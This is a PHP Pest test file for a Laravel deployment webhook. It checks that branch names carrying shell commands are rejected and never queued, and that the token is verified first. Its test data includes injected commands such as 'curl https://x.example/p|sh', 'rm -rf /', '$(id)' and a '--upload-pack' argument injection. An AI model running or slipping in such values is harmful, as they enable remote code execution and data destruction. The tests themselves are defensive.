<?php

use Illuminate\Foundation\Console\QueuedCommand;
use Illuminate\Support\Facades\Queue;

beforeEach(function () {
    config(['app.deploy_webhook_token' => 'jeton-de-test']);
    Queue::fake();
});

function appelerWebhook(array $charge, ?string $jeton = 'jeton-de-test')
{
    $entetes = $jeton === null ? [] : ['Authorization' => "Bearer {$jeton}"];

    return test()->postJson('/api/deploy', $charge, $entetes);
}

it('refuse une branche porteuse d\'une commande shell avec 422, sans rien mettre en file', function (string $branche) {
    appelerWebhook(['tenant_code' => 'presentation', 'branch' => $branche])
        ->assertStatus(422)
        ->assertJsonValidationErrors('branch');

    Queue::assertNothingPushed();
})->with([
    'presentation;curl https://x.example/p|sh',
    'main && rm -rf /',
    '$(id)',
    '--upload-pack=id',
    'feat/../main',
]);

it('met en file un déploiement dont la branche est bien formée', function () {
    appelerWebhook(['tenant_code' => 'presentation', 'branch' => 'feat/lmd-jury'])
        ->assertStatus(202)
        ->assertJsonPath('queued.branch', 'feat/lmd-jury');

    Queue::assertPushed(QueuedCommand::class, 1);
});

it('vérifie le jeton avant la charge utile : 401 même sur une branche piégée', function () {
    appelerWebhook(['branch' => 'x;id'], 'mauvais-jeton')->assertStatus(401);
    appelerWebhook(['branch' => 'x;id'], null)->assertStatus(401);

    Queue::assertNothingPushed();
});
